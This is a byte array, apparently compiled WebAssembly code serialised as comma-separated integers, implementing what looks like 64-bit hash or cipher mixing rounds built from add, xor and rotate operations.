54,32,42,131,133,34,31,32,29,133,33,28,32,37,32,52,133,33,33,32,32,32,35,133,32,29,32,43,133,32,26,32,41,131,133,34,41,133,33,29,32,32,32,36,133,33,42,32,39,32,44,133,32,59,32,51,133,32,38,131,32,30,133,34,26,133,32,56,32,46,133,32,27,131,32,25,133,34,27,32,48,131,32,57,133,34,38,133,34,25,32,58,133,34,30,32,27,32,40,133,34,35,32,49,133,32,64,32,44,131,133,34,27,32,39,133,32,0,65,5,116,65,184,63,106,41,0,0,34,36,32,34,32,35,133,32,39,32,63,133,32,26,32,49,131,133,34,35,133,34,26,66,127,133,131,133,34,40,131,32,36,133,33,39,32,27,66,32,134,32,27,66,32,136,132,34,36,32,34,66,32,134,32,34,66,32,136,132,32,0,65,5,116,65,200,63,106,41,0,0,34,27,32,25,66,32,134,32,25,66,32,136,132,34,25,66,127,133,131,133,34,44,131,32,27,133,33,45,32,40,32,26,32,34,32,38,133,34,40,66,127,133,34,38,131,133,33,34,32,44,32,25,32,35,66,32,134,32,35,66,32,136,132,34,44,66,127,133,34,43,131,133,33,27,32,26,32,30,66,127,133,131,34,48,32,38,133,34,49,32,30,32,34,32,26,131,133,34,35,132,32,34,133,34,38,32,39,131,32,35,133,34,46,32,25,32,36,66,127,133,131,34,51,32,43,133,34,43,32,27,32,25,131,32,36,133,34,36,132,32,27,133,34,47,133,33,30,32,38,32,45,133,32,51,32,44,133,32,27,131,32,25,133,34,27,133,32,48,32,40,133,32,34,131,32,26,133,34,34,32,35,131,32,49,133,34,40,133,33,35,32,34,32,39,133,34,39,32,36,133,32,47,32,45,131,133,34,26,32,38,133,33,25,32,35,32,46,133,33,34,32,30,32,39,133,32,38,32,43,133,32,27,32,36,131,133,34,39,133,33,27,32,30,32,40,133,33,38,32,60,66,7,124,34,60,66,42,84,13,0,11,32,1,32,28,55,3,0,32,5,32,33,55,3,0,32,3,32,30,55,3,0,32,7,32,26,55,3,0,32,2,32,25,55,3,0,32,4,32,32,55,3,0,32,6,32,34,55,3,0,32,8,32,31,55,3,0,32,23,32,9,41,3,0,32,29,133,55,3,0,32,19,32,10,41,3,0,32,27,133,55,3,0,32,24,32,11,41,3,0,32,35,133,55,3,0,32,20,32,12,41,3,0,32,37,133,55,3,0,32,21,32,13,41,3,0,32,42,133,55,3,0,32,17,32,14,41,3,0,32,38,133,55,3,0,32,22,32,15,41,3,0,32,39,133,55,3,0,32,18,32,16,41,3,0,32,41,133,55,3,0,11,179,52,2,9,127,42,126,32,3,173,33,44,32,2,65,127,106,173,33,45,32,0,65,8,106,34,4,41,3,0,34,46,33,36,32,0,65,16,106,34,5,41,3,0,33,34,32,0,65,208,0,106,34,6,41,3,0,33,26,32,0,65,200,0,106,34,7,41,3,0,33,25,32,0,65,192,0,106,34,8,41,3,0,33,24,32,0,65,56,106,34,9,41,3,0,33,27,32,0,65,48,106,34,10,41,3,0,33,28,32,0,65,40,106,34,11,41,3,0,33,29,32,0,65,32,106,34,12,41,3,0,33,30,32,0,65,24,106,34,3,41,3,0,33,31,3,64,32,36,32,44,124,34,36,32,34,133,33,35,32,1,65,192,0,106,33,0,32,1,41,0,0,34,47,32,31,124,32,1,41,0,8,34,48,32,30,124,34,13,124,33,21,32,1,41,0,48,34,49,32,34,32,25,124,34,37,124,32,1,41,0,56,34,50,32,26,124,34,17,124,33,22,32,1,41,0,16,34,51,32,29,124,32,1,41,0,24,34,52,32,28,124,34,14,124,34,16,32,13,66,46,134,32,13,66,18,136,132,32,21,133,34,20,124,33,19,32,17,66,37,134,32,17,66,27,136,132,32,22,133,34,18,32,1,41,0,32,34,53,32,27,124,32,1,41,0,40,34,54,32,36,32,24,124,34,38,124,34,15,124,34,17,124,33,13,32,14,66,36,134,32,14,66,28,136,132,32,16,133,34,14,32,21,124,33,33,32,18,66,27,134,32,18,66,37,136,132,32,13,133,34,23,32,19,124,33,21,32,13,32,20,66,33,134,32,20,66,31,136,132,32,19,133,34,16,124,34,13,32,16,66,17,134,32,16,66,47,136,132,133,34,18,32,15,66,19,134,32,15,66,45,136,132,32,17,133,34,15,32,22,124,34,16,32,14,66,42,134,32,14,66,22,136,132,32,33,133,34,14,124,34,17,124,33,20,32,13,32,14,66,49,134,32,14,66,15,136,132,32,17,133,34,19,124,33,22,32,23,66,39,134,32,23,66,25,136,132,32,21,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,33,124,34,16,124,34,17,32,30,124,32,18,66,44,134,32,18,66,20,136,132,32,20,133,32,29,124,34,13,124,33,18,32,20,32,35,32,26,124,34,39,124,32,26,66,162,180,240,207,170,251,198,232,27,133,32,25,133,32,24,133,32,27,133,32,28,133,32,29,133,32,30,133,32,31,133,34,32,66,1,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,23,32,13,66,39,134,32,13,66,25,136,132,32,18,133,34,20,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,21,124,34,16,32,28,124,32,19,66,56,134,32,19,66,8,136,132,32,22,133,32,27,124,34,13,124,34,17,124,33,19,32,18,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,18,124,33,21,32,14,66,24,134,32,14,66,40,136,132,32,23,133,34,14,32,22,32,24,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,37,124,34,15,124,34,16,124,34,17,32,20,66,13,134,32,20,66,51,136,132,32,19,133,34,13,124,33,20,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,19,124,33,22,32,13,66,25,134,32,13,66,39,136,132,32,20,133,34,19,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,23,124,34,16,32,18,66,17,134,32,18,66,47,136,132,32,21,133,34,13,124,34,17,124,33,18,32,20,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,20,124,33,23,32,14,66,43,134,32,14,66,21,136,132,32,22,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,21,124,34,16,124,34,17,32,29,124,32,19,66,8,134,32,19,66,56,136,132,32,18,133,32,28,124,34,13,124,33,19,32,18,32,32,32,36,124,34,40,124,32,31,66,2,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,21,32,13,66,46,134,32,13,66,18,136,132,32,19,133,34,18,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,22,124,34,16,32,27,124,32,20,66,22,134,32,20,66,42,136,132,32,23,133,32,24,124,34,13,124,34,17,124,33,20,32,19,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,19,124,33,22,32,14,66,37,134,32,14,66,27,136,132,32,21,133,34,14,32,23,32,25,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,39,124,34,15,124,34,16,124,34,17,32,18,66,33,134,32,18,66,31,136,132,32,20,133,34,13,124,33,18,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,20,124,33,23,32,13,66,17,134,32,13,66,47,136,132,32,18,133,34,20,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,21,124,34,16,32,19,66,42,134,32,19,66,22,136,132,32,22,133,34,13,124,34,17,124,33,19,32,18,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,18,124,33,21,32,14,66,39,134,32,14,66,25,136,132,32,23,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,22,124,34,16,124,34,17,32,28,124,32,20,66,44,134,32,20,66,20,136,132,32,19,133,32,27,124,34,13,124,33,20,32,19,32,34,32,31,124,34,41,124,32,30,66,3,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,22,32,13,66,39,134,32,13,66,25,136,132,32,20,133,34,19,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,23,124,34,16,32,24,124,32,18,66,56,134,32,18,66,8,136,132,32,21,133,32,25,124,34,13,124,34,17,124,33,18,32,20,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,20,124,33,23,32,14,66,24,134,32,14,66,40,136,132,32,22,133,34,14,32,21,32,26,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,40,124,34,15,124,34,16,124,34,17,32,19,66,13,134,32,19,66,51,136,132,32,18,133,34,13,124,33,19,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,18,124,33,21,32,13,66,25,134,32,13,66,39,136,132,32,19,133,34,18,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,22,124,34,16,32,20,66,17,134,32,20,66,47,136,132,32,23,133,34,13,124,34,17,124,33,20,32,19,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,19,124,33,22,32,14,66,43,134,32,14,66,21,136,132,32,21,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,23,124,34,16,124,34,17,32,27,124,32,18,66,8,134,32,18,66,56,136,132,32,20,133,32,24,124,34,13,124,33,18,32,20,32,35,32,30,124,34,42,124,32,29,66,4,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,23,32,13,66,46,134,32,13,66,18,136,132,32,18,133,34,20,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,21,124,34,16,32,25,124,32,19,66,22,134,32,19,66,42,136,132,32,22,133,32,26,124,34,13,124,34,17,124,33,19,32,18,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,18,124,33,21,32,14,66,37,134,32,14,66,27,136,132,32,23,133,34,14,32,22,32,32,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,41,124,34,15,124,34,16,124,34,17,32,20,66,33,134,32,20,66,31,136,132,32,19,133,34,13,124,33,20,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,19,124,33,22,32,13,66,17,134,32,13,66,47,136,132,32,20,133,34,19,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,23,124,34,16,32,18,66,42,134,32,18,66,22,136,132,32,21,133,34,13,124,34,17,124,33,18,32,20,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,20,124,33,23,32,14,66,39,134,32,14,66,25,136,132,32,22,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,21,124,34,16,124,34,17,32,24,124,32,19,66,44,134,32,19,66,20,136,132,32,18,133,32,25,124,34,13,124,33,19,32,18,32,36,32,29,124,34,33,124,32,28,66,5,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,21,32,13,66,39,134,32,13,66,25,136,132,32,19,133,34,18,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,22,124,34,16,32,26,124,32,20,66,56,134,32,20,66,8,136,132,32,23,133,32,32,124,34,13,124,34,17,124,33,20,32,19,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,19,124,33,22,32,14,66,24,134,32,14,66,40,136,132,32,21,133,34,14,32,23,32,31,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,42,124,34,15,124,34,16,124,34,17,32,18,66,13,134,32,18,66,51,136,132,32,20,133,34,13,124,33,18,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,20,124,33,23,32,13,66,25,134,32,13,66,39,136,132,32,18,133,34,20,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,21,124,34,16,32,19,66,17,134,32,19,66,47,136,132,32,22,133,34,13,124,34,17,124,33,19,32,18,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,18,124,33,21,32,14,66,43,134,32,14,66,21,136,132,32,23,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,22,124,34,16,124,34,17,32,25,124,32,20,66,8,134,32,20,66,56,136,132,32,19,133,32,26,124,34,13,124,33,20,32,19,32,34,32,28,124,34,43,124,32,27,66,6,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,22,32,13,66,46,134,32,13,66,18,136,132,32,20,133,34,19,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,23,124,34,16,32,32,124,32,18,66,22,134,32,18,66,42,136,132,32,21,133,32,31,124,34,13,124,34,17,124,33,18,32,20,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,20,124,33,23,32,14,66,37,134,32,14,66,27,136,132,32,22,133,34,14,32,21,32,30,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,33,124,34,15,124,34,16,124,34,17,32,19,66,33,134,32,19,66,31,136,132,32,18,133,34,13,124,33,19,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,18,124,33,21,32,13,66,17,134,32,13,66,47,136,132,32,19,133,34,18,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,22,124,34,16,32,20,66,42,134,32,20,66,22,136,132,32,23,133,34,13,124,34,17,124,33,20,32,19,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,19,124,33,22,32,14,66,39,134,32,14,66,25,136,132,32,21,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,23,124,34,16,124,34,17,32,26,124,32,18,66,44,134,32,18,66,20,136,132,32,20,133,32,32,124,34,13,124,33,18,32,20,32,35,32,27,124,34,35,124,32,24,66,7,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,23,32,13,66,39,134,32,13,66,25,136,132,32,18,133,34,20,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,21,124,34,16,32,31,124,32,19,66,56,134,32,19,66,8,136,132,32,22,133,32,30,124,34,13,124,34,17,124,33,19,32,18,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,18,124,33,21,32,14,66,24,134,32,14,66,40,136,132,32,23,133,34,14,32,22,32,29,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,43,124,34,15,124,34,16,124,34,17,32,20,66,13,134,32,20,66,51,136,132,32,19,133,34,13,124,33,20,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,19,124,33,22,32,13,66,25,134,32,13,66,39,136,132,32,20,133,34,19,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,23,124,34,16,32,18,66,17,134,32,18,66,47,136,132,32,21,133,34,13,124,34,17,124,33,18,32,20,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,20,124,33,23,32,14,66,43,134,32,14,66,21,136,132,32,22,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,21,124,34,16,124,34,17,32,32,124,32,19,66,8,134,32,19,66,56,136,132,32,18,133,32,31,124,34,13,124,33,19,32,18,32,38,124,32,25,66,8,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,21,32,13,66,46,134,32,13,66,18,136,132,32,19,133,34,18,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,22,124,34,16,32,30,124,32,20,66,22,134,32,20,66,42,136,132,32,23,133,32,29,124,34,13,124,34,17,124,33,20,32,19,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,19,124,33,22,32,14,66,37,134,32,14,66,27,136,132,32,21,133,34,14,32,23,32,28,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,35,124,34,15,124,34,16,124,34,17,32,18,66,33,134,32,18,66,31,136,132,32,20,133,34,13,124,33,18,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,20,124,33,23,32,13,66,17,134,32,13,66,47,136,132,32,18,133,34,20,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,21,124,34,16,32,19,66,42,134,32,19,66,22,136,132,32,22,133,34,13,124,34,17,124,33,19,32,18,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,18,124,33,21,32,14,66,39,134,32,14,66,25,136,132,32,23,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,22,124,34,16,124,34,17,32,31,124,32,20,66,44,134,32,20,66,20,136,132,32,19,133,32,30,124,34,13,124,33,20,32,19,32,37,124,32,26,66,9,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,22,32,13,66,39,134,32,13,66,25,136,132,32,20,133,34,19,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,23,124,34,16,32,29,124,32,18,66,56,134,32,18,66,8,136,132,32,21,133,32,28,124,34,13,124,34,17,124,33,18,32,20,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,20,124,33,23,32,14,66,24,134,32,14,66,40,136,132,32,22,133,34,14,32,21,32,27,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,38,124,34,15,124,34,16,124,34,17,32,19,66,13,134,32,19,66,51,136,132,32,18,133,34,13,124,33,19,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,18,124,33,21,32,13,66,25,134,32,13,66,39,136,132,32,19,133,34,18,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,22,124,34,16,32,20,66,17,134,32,20,66,47,136,132,32,23,133,34,13,124,34,17,124,33,20,32,19,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,19,124,33,22,32,14,66,43,134,32,14,66,21,136,132,32,21,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,23,124,34,16,124,34,17,32,30,124,32,18,66,8,134,32,18,66,56,136,132,32,20,133,32,29,124,34,13,124,33,18,32,20,32,39,124,32,32,66,10,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,23,32,13,66,46,134,32,13,66,18,136,132,32,18,133,34,20,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,21,124,34,16,32,28,124,32,19,66,22,134,32,19,66,42,136,132,32,22,133,32,27,124,34,13,124,34,17,124,33,19,32,18,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,18,124,33,21,32,14,66,37,134,32,14,66,27,136,132,32,23,133,34,14,32,22,32,24,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,37,124,34,15,124,34,16,124,34,17,32,20,66,33,134,32,20,66,31,136,132,32,19,133,34,13,124,33,20,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,19,124,33,22,32,13,66,17,134,32,13,66,47,136,132,32,20,133,34,19,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,23,124,34,16,32,18,66,42,134,32,18,66,22,136,132,32,21,133,34,13,124,34,17,124,33,18,32,20,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,20,124,33,23,32,14,66,39,134,32,14,66,25,136,132,32,22,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,21,124,34,16,124,34,17,32,29,124,32,19,66,44,134,32,19,66,20,136,132,32,18,133,32,28,124,34,13,124,33,19,32,18,32,40,124,32,31,66,11,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,21,32,13,66,39,134,32,13,66,25,136,132,32,19,133,34,18,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,22,124,34,16,32,27,124,32,20,66,56,134,32,20,66,8,136,132,32,23,133,32,24,124,34,13,124,34,17,124,33,20,32,19,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,19,124,33,22,32,14,66,24,134,32,14,66,40,136,132,32,21,133,34,14,32,23,32,25,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,39,124,34,15,124,34,16,124,34,17,32,18,66,13,134,32,18,66,51,136,132,32,20,133,34,13,124,33,18,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,20,124,33,23,32,13,66,25,134,32,13,66,39,136,132,32,18,133,34,20,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,21,124,34,16,32,19,66,17,134,32,19,66,47,136,132,32,22,133,34,13,124,34,17,124,33,19,32,18,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,18,124,33,21,32,14,66,43,134,32,14,66,21,136,132,32,23,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,22,124,34,16,124,34,17,32,28,124,32,20,66,8,134,32,20,66,56,136,132,32,19,133,32,27,124,34,13,124,33,20,32,19,32,41,124,32,30,66,12,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,22,32,13,66,46,134,32,13,66,18,136,132,32,20,133,34,19,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,23,124,34,16,32,24,124,32,18,66,22,134,32,18,66,42,136,132,32,21,133,32,25,124,34,13,124,34,17,124,33,18,32,20,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,20,124,33,23,32,14,66,37,134,32,14,66,27,136,132,32,22,133,34,14,32,21,32,26,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,40,124,34,15,124,34,16,124,34,17,32,19,66,33,134,32,19,66,31,136,132,32,18,133,34,13,124,33,19,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,18,124,33,21,32,13,66,17,134,32,13,66,47,136,132,32,19,133,34,18,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,22,124,34,16,32,20,66,42,134,32,20,66,22,136,132,32,23,133,34,13,124,34,17,124,33,20,32,19,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,19,124,33,22,32,14,66,39,134,32,14,66,25,136,132,32,21,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,23,124,34,16,124,34,17,32,27,124,32,18,66,44,134,32,18,66,20,136,132,32,20,133,32,24,124,34,13,124,33,18,32,20,32,42,124,32,29,66,13,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,23,32,13,66,39,134,32,13,66,25,136,132,32,18,133,34,20,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,21,124,34,16,32,25,124,32,19,66,56,134,32,19,66,8,136,132,32,22,133,32,26,124,34,13,124,34,17,124,33,19,32,18,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,18,124,33,21,32,14,66,24,134,32,14,66,40,136,132,32,23,133,34,14,32,22,32,32,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,41,124,34,15,124,34,16,124,34,17,32,20,66,13,134,32,20,66,51,136,132,32,19,133,34,13,124,33,20,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,19,124,33,22,32,13,66,25,134,32,13,66,39,136,132,32,20,133,34,19,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,15,32,23,124,34,16,32,18,66,17,134,32,18,66,47,136,132,32,21,133,34,13,124,34,17,124,33,18,32,20,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,20,124,33,23,32,14,66,43,134,32,14,66,21,136,132,32,22,133,34,14,32,15,66,10,134,32,15,66,54,136,132,32,16,133,34,15,32,21,124,34,16,124,34,17,32,24,124,32,19,66,8,134,32,19,66,56,136,132,32,18,133,32,25,124,34,13,124,33,19,32,18,32,33,124,32,28,66,14,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,21,32,13,66,46,134,32,13,66,18,136,132,32,19,133,34,18,32,15,66,39,134,32,15,66,25,136,132,32,16,133,34,15,32,22,124,34,16,32,26,124,32,20,66,22,134,32,20,66,42,136,132,32,23,133,32,32,124,34,13,124,34,17,124,33,20,32,19,32,13,66,36,134,32,13,66,28,136,132,32,17,133,34,19,124,33,22,32,14,66,37,134,32,14,66,27,136,132,32,21,133,34,14,32,23,32,31,124,32,15,66,56,134,32,15,66,8,136,132,32,16,133,32,42,124,34,15,124,34,16,124,34,17,32,18,66,33,134,32,18,66,31,136,132,32,20,133,34,13,124,33,18,32,14,66,27,134,32,14,66,37,136,132,32,17,133,34,14,32,20,124,33,23,32,13,66,17,134,32,13,66,47,136,132,32,18,133,34,20,32,15,66,19,134,32,15,66,45,136,132,32,16,133,34,15,32,21,124,34,16,32,19,66,42,134,32,19,66,22,136,132,32,22,133,34,13,124,34,17,124,33,19,32,18,32,13,66,49,134,32,13,66,15,136,132,32,17,133,34,18,124,33,21,32,14,66,39,134,32,14,66,25,136,132,32,23,133,34,14,32,15,66,14,134,32,15,66,50,136,132,32,16,133,34,15,32,22,124,34,16,124,34,17,32,25,124,32,20,66,44,134,32,20,66,20,136,132,32,19,133,32,26,124,34,13,124,33,20,32,19,32,43,124,32,27,66,15,124,32,14,66,9,134,32,14,66,55,136,132,32,17,133,124,34,14,124,33,22,32,13,66,39,134,32,13,66,25,136,132,32,20,133,34,19,32,15,66,36,134,32,15,66,28,136,132,32,16,133,34,15,32,23,124,34,16,32,32,124,32,18,66,56,134,32,18,66,8,136,132,32,21,133,32,31,124,34,13,124,34,17,124,33,18,32,20,32,13,66,30,134,32,13,66,34,136,132,32,17,133,34,20,124,33,23,32,14,66,24,134,32,14,66,40,136,132,32,22,133,34,14,32,21,32,30,124,32,15,66,54,134,32,15,66,10,136,132,32,16,133,32,33,124,34,15,124,34,16,124,34,17,32,19,66,13,134,32,19,66,51,136,132,32,18,133,34,13,124,33,19,32,14,66,50,134,32,14,66,14,136,132,32,17,133,34,14,32,18,124,33,33,32,13,66,25,134,32,13,66,39,136,132,32,19,133,34,21,32,15,66,34,134,32,15,66,30,136,132,32,16,133,34,18,32,22,124,34,16,32,20,66,17,134,32,20,66,47,136,132,32,23,133,34,13,124,34,17,124,33,15,32,19,32,13,66,29,134,32,13,66,35,136,132,32,17,133,34,20,124,33,22,32,14,66,43,134,32,14,66,21,136,132,32,33,133,34,14,32,18,66,10,134,32,18,66,54,136,132,32,16,133,34,19,32,23,124,34,16,124,34,17,32,26,124,32,21,66,8,134,32,21,66,56,136,132,32,15,133,32,32,124,34,13,124,33,18,32,15,32,35,124,32,24,66,16,124,32,14,66,35,134,32,14,66,29,136,132,32,17,133,124,34,14,124,33,23,32,13,66,46,134,32,13,66,18,136,132,32,18,133,34,15,32,19,66,39,134,32,19,66,25,136,132,32,16,133,34,13,32,33,124,34,17,32,31,124,32,20,66,22,134,32,20,66,42,136,132,32,22,133,32,30,124,34,16,124,34,24,124,33,20,32,18,32,16,66,36,134,32,16,66,28,136,132,32,24,133,34,19,124,33,21,32,14,66,37,134,32,14,66,27,136,132,32,23,133,34,14,32,22,32,29,124,32,13,66,56,134,32,13,66,8,136,132,32,17,133,32,43,124,34,13,124,34,17,124,34,24,32,15,66,33,134,32,15,66,31,136,132,32,20,133,34,16,124,33,18,32,14,66,27,134,32,14,66,37,136,132,32,24,133,34,15,32,20,124,33,22,32,16,66,17,134,32,16,66,47,136,132,32,18,133,34,14,32,13,66,19,134,32,13,66,45,136,132,32,17,133,34,13,32,23,124,34,17,32,19,66,42,134,32,19,66,22,136,132,32,21,133,34,16,124,34,24,124,33,19,32,18,32,16,66,49,134,32,16,66,15,136,132,32,24,133,34,18,124,33,20,32,15,66,39,134,32,15,66,25,136,132,32,22,133,34,16,32,13,66,14,134,32,13,66,50,136,132,32,17,133,34,15,32,21,124,34,17,124,34,24,32,32,124,32,14,66,44,134,32,14,66,20,136,132,32,19,133,32,31,124,34,13,124,33,14,32,19,32,38,124,32,25,66,17,124,32,16,66,9,134,32,16,66,55,136,132,32,24,133,124,34,16,124,33,21,32,13,66,39,134,32,13,66,25,136,132,32,14,133,34,19,32,15,66,36,134,32,15,66,28,136,132,32,17,133,34,13,32,22,124,34,24,32,30,124,32,18,66,56,134,32,18,66,8,136,132,32,20,133,32,29,124,34,17,124,34,25,124,33,18,32,14,32,17,66,30,134,32,17,66,34,136,132,32,25,133,34,15,124,33,22,32,16,66,24,134,32,16,66,40,136,132,32,21,133,34,16,32,20,32,28,124,32,13,66,54,134,32,13,66,10,136,132,32,24,133,32,35,124,34,14,124,34,24,124,34,25,32,19,66,13,134,32,19,66,51,136,132,32,18,133,34,17,124,33,13,32,16,66,50,134,32,16,66,14,136,132,32,25,133,34,16,32,18,124,33,20,32,17,66,25,134,32,17,66,39,136,132,32,13,133,34,19,32,14,66,34,134,32,14,66,30,136,132,32,24,133,34,18,32,21,124,34,24,32,15,66,17,134,32,15,66,47,136,132,32,22,133,34,17,124,34,25,124,33,15,32,13,32,17,66,29,134,32,17,66,35,136,132,32,25,133,34,14,124,33,13,32,3,32,16,66,43,134,32,16,66,21,136,132,32,20,133,34,16,32,18,66,10,134,32,18,66,54,136,132,32,24,133,34,24,32,22,124,34,25,124,34,17,32,31,124,32,47,133,34,31,55,3,0,32,12,32,19,66,8,134,32,19,66,56,136,132,32,15,133,32,30,124,32,48,133,34,30,55,3,0,32,11,32,24,66,39,134,32,24,66,25,136,132,32,25,133,34,24,32,20,124,34,25,32,29,124,32,51,133,34,29,55,3,0,32,10,32,14,66,22,134,32,14,66,42,136,132,32,13,133,32,28,124,32,52,133,34,28,55,3,0,32,9,32,13,32,27,124,32,53,133,34,27,55,3,0,32,8,32,24,66,56,134,32,24,66,8,136,132,32,25,133,32,38,124,32,54,133,34,24,55,3,0,32,7,32,15,32,37,124,32,49,133,34,25,55,3,0,32,6,32,26,66,18,124,32,16,66,35,134,32,16,66,29,136,132,32,17,133,124,32,50,133,34,26,55,3,0,32,34,66,255,255,255,255,255,255,255,255,191,127,131,33,34,32,2,65,127,106,34,2,4,64,32,0,33,1,12,1,11,11,32,4,32,46,32,45,66,1,124,32,44,126,124,55,3,0,32,5,32,34,55,3,0,11,236,10,1,67,127,35,4,33,3,35,4,65,128,2,106,36,4,32,2,65,63,76,4,64,32,3,36,4,15,11,32,3,65,192,0,106,33,4,32,3,65,192,1,106,34,5,65,4,106,33,8,32,5,65,8,106,33,9,32,5,65,12,106,33,10,32,5,65,16,106,33,11,32,5,65,20,106,33,12,32,5,65,24,106,33,13,32,5,65,28,106,33,14,32,5,65,32,106,33,15,32,5,65,36,106,33,16,32,5,65,40,106,33,17,32,5,65,44,106,33,18,32,5,65,48,106,33,19,32,5,65,52,106,33,20,32,5,65,56,106,33,21,32,5,65,60,106,33,22,32,3,65,128,1,106,34,6,65,4,106,33,55,32,6,65,8,106,33,56,